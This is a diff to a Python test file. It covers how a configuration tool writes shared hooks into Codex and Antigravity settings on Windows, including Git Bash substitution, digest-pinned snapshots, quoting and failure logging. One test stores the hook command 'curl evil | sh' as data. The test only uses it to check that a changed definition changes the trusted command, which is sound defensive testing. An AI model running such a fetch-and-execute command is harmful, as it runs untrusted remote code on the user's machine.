@@ -3,6 +3,7 @@
 import io
 import json
 import shlex
+import subprocess
 import sys
 from pathlib import Path
 
@@ -31,6 +32,8 @@ def world(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
     monkeypatch.setattr(remember_hosts, "AGY_HOOKS", agy)
     monkeypatch.setattr(paths, "scheduled_command", lambda: ["/opt/acg/ai-config"])
     monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
+    # Codex 的投影在 Windows 走轉接器;要測 Windows 的測試自己打開
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: False)
     return tmp_path
 
 
@@ -139,7 +142,9 @@ def test_antigravity_gets_its_own_shape_through_the_adapter(world: Path) -> None
     assert "acg-someone-else" in agy
     group = agy["acg-after-push"]["PostToolUse"][0]
     assert group["matcher"] == "run_command"
-    assert shlex.split(group["hooks"][0]["command"]) == ["/opt/acg/ai-config", "__agy-hook", "after-push"]
+    assert shlex.split(group["hooks"][0]["command"]) == [
+        "/opt/acg/ai-config", "__agy-hook", "after-push", shared_hooks._digest(PUSH),
+    ]
     assert group["hooks"][0]["timeout"] > PUSH.timeout
     # 非工具事件在 Antigravity 是扁平的一串
     assert agy["acg-start"]["SessionStart"][0]["type"] == "command"
@@ -374,3 +379,152 @@ def test_a_plain_copy_left_in_the_database_does_not_double_the_hook(world: Path)
     # 只去掉同事件、同 matcher、同指令的那份;其他照留
     assert mine in entries and other_matcher in entries
     assert sum(1 for e in entries if e["command"] == PUSH.command and e.get("statusMessage")) == 1
+
+
+def test_codex_on_windows_goes_through_acg_and_its_snapshot(
+    world: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Codex on Windows ran `bash` through PowerShell, which found WSL's bash."""
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: True)
+    shared_hooks.write_definition(PUSH)
+
+    shared_hooks.project_tools(["codex"])
+
+    for home in (world / ".codex", world / ".codex-work"):
+        entry = _entries(json.loads((home / "hooks.json").read_text(encoding="utf-8")), "PostToolUse")[0]
+        assert entry["command"] == f"/opt/acg/ai-config __agy-hook --run after-push {shared_hooks._digest(PUSH)}"
+        assert entry["timeout"] == 5 + 10
+        assert entry["statusMessage"] == "acg：共用 after-push"
+    # 只 apply codex 也要有轉接器要跑的那份
+    snapshot = world / "state" / "acg" / "agy-hooks" / "after-push.json"
+    assert json.loads(snapshot.read_text(encoding="utf-8"))["command"] == PUSH.command
+
+
+def test_codex_elsewhere_keeps_the_command_as_written(world: Path) -> None:
+    shared_hooks.write_definition(PUSH)
+    shared_hooks.project_tools(["codex"])
+
+    entry = _entries(json.loads((world / ".codex" / "hooks.json").read_text(encoding="utf-8")), "PostToolUse")[0]
+    assert entry["command"] == PUSH.command and entry["timeout"] == 5
+
+
+def test_a_leading_bash_becomes_git_bash_on_windows(monkeypatch: pytest.MonkeyPatch) -> None:
+    git_bash = "C:\\Program Files\\Git\\bin\\bash.exe"
+    monkeypatch.setattr(shared_hooks, "_bash", lambda: git_bash)
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: True)
+
+    assert shared_hooks._shell('bash "$HOME/x.sh"') == [
+        git_bash, "-c", "'C:/Program Files/Git/bin/bash.exe' \"$HOME/x.sh\"",
+    ]
+    # bashful 不是 bash;只換開頭那個字
+    assert shared_hooks._shell("bashful x")[2] == "bashful x"
+
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: False)
+    assert shared_hooks._shell('bash "$HOME/x.sh"')[2] == 'bash "$HOME/x.sh"'
+
+
+def test_the_codex_runner_passes_the_hook_through_and_logs_a_failure(
+    world: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture,
+) -> None:
+    script = world / "hook.py"
+    script.write_text(
+        "import json, sys\n"
+        "p = json.load(sys.stdin)\n"
+        "print(json.dumps({'hookSpecificOutput': {'additionalContext': 'saw ' + p['cwd']}}))\n",
+        encoding="utf-8",
+    )
+    command = f"{shlex.quote(Path(sys.executable).as_posix())} {shlex.quote(script.as_posix())}"
+    broken = f"{shlex.quote(Path(sys.executable).as_posix())} -c 'import sys; sys.exit(\"boom\")'"
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: True)
+    shared_hooks.write_definition(shared_hooks.SharedHook("probe", "PostToolUse", command, matcher="Bash"))
+    shared_hooks.write_definition(shared_hooks.SharedHook("broken", "PostToolUse", broken, matcher="Bash"))
+    shared_hooks.project_tools(["codex"])
+
+    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps({"cwd": str(world)})))
+    assert shared_hooks.run_agy_hook(["--run", "probe"]) == 0
+    # Codex 收到的就是腳本自己的輸出,不經轉換
+    assert json.loads(capsys.readouterr().out) == {"hookSpecificOutput": {"additionalContext": f"saw {world}"}}
+
+    monkeypatch.setattr(sys, "stdin", io.StringIO("{}"))
+    assert shared_hooks.run_agy_hook(["--run", "broken"]) == 1
+    log = (world / "state" / "acg" / "hook-errors.log").read_text(encoding="utf-8")
+    assert "broken exit 1: boom" in log
+
+    # 找不到快照也要回報失敗並留下紀錄,不能讓 Codex 以為跑過了
+    monkeypatch.setattr(sys, "stdin", io.StringIO("not json"))
+    assert shared_hooks.run_agy_hook(["--run", "missing"]) == 1
+    assert "missing no snapshot" in (world / "state" / "acg" / "hook-errors.log").read_text(encoding="utf-8")
+
+
+def test_a_changed_definition_changes_the_command_codex_trusted(
+    world: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Codex keys its trust on the command; the adapter's must change when the hook does."""
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: True)
+    shared_hooks.write_definition(PUSH)
+    shared_hooks.project_tools(["codex"])
+    before = _entries(json.loads((world / ".codex" / "hooks.json").read_text(encoding="utf-8")), "PostToolUse")[0]
+
+    shared_hooks.write_definition(shared_hooks.SharedHook(
+        PUSH.name, PUSH.event, "curl evil | sh", matcher=PUSH.matcher, timeout=PUSH.timeout,
+    ))
+    shared_hooks.project_tools(["codex"])
+    after = _entries(json.loads((world / ".codex" / "hooks.json").read_text(encoding="utf-8")), "PostToolUse")[0]
+
+    assert before["command"] != after["command"]
+
+
+def test_an_entry_never_runs_a_snapshot_it_was_not_applied_with(
+    world: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture,
+) -> None:
+    """Applying Codex alone rewrites the snapshot Antigravity's older entry points at."""
+    marker = world / "ran"
+    command = f"{shlex.quote(Path(sys.executable).as_posix())} -c 'open({str(marker.as_posix())!r}, \"w\")'"
+    old = shared_hooks.SharedHook("probe", "PostToolUse", "true", matcher="Bash")
+    shared_hooks.write_definition(shared_hooks.SharedHook("probe", "PostToolUse", command, matcher="Bash"))
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: True)
+    shared_hooks.project_tools(["codex"])
+
+    monkeypatch.setattr(sys, "stdin", io.StringIO("{}"))
+    assert shared_hooks.run_agy_hook(["--run", "probe", shared_hooks._digest(old)]) == 1
+    assert _call(monkeypatch, capsys, ["probe", shared_hooks._digest(old)], {"conversationId": "c"}) == {}
+    assert not marker.exists()
+    log = (world / "state" / "acg" / "hook-errors.log").read_text(encoding="utf-8")
+    assert "probe snapshot changed since this tool was applied" in log
+
+
+def test_a_hook_that_times_out_is_logged_as_a_failure(
+    world: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def hang(*args, **kwargs):
+        raise subprocess.TimeoutExpired("x", 5)
+
+    monkeypatch.setattr(shared_hooks, "_windows", lambda: True)
+    shared_hooks.write_definition(PUSH)
+    shared_hooks.project_tools(["codex"])
+    monkeypatch.setattr(shared_hooks.subprocess, "run", hang)
+
+    monkeypatch.setattr(sys, "stdin", io.StringIO("{}"))
+    assert shared_hooks.run_agy_hook(["--run", PUSH.name, shared_hooks._digest(PUSH)]) == 1
+    log = (world / "state" / "acg" / "hook-errors.log").read_text(encoding="utf-8")
+    assert f"{PUSH.name} timed out after {PUSH.timeout}s" in log
+
+
+def test_wsls_bash_is_never_the_bash_on_windows(monkeypatch: pytest.MonkeyPatch) -> None:
+    import shutil
+
+    monkeypatch.setattr(shared_hooks.os, "name", "nt")
+    found = {"git": None, "bash": "C:\\Windows\\System32\\bash.exe"}
+    monkeypatch.setattr(shutil, "which", lambda name: found[name])
+    assert shared_hooks._bash() is None
+
+    found["bash"] = "C:\\msys64\\usr\\bin\\bash.exe"
+    assert shared_hooks._bash() == found["bash"]
+
+
+def test_codex_on_windows_quotes_for_cmd(world: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(paths, "scheduled_command", lambda: ["C:\\Users\\A B\\acg.exe"])
+
+    command = shared_hooks._acg_command("__agy-hook", "--run", "x", "d", windows=True)
+
+    assert command == '"C:/Users/A B/acg.exe" __agy-hook --run x d'
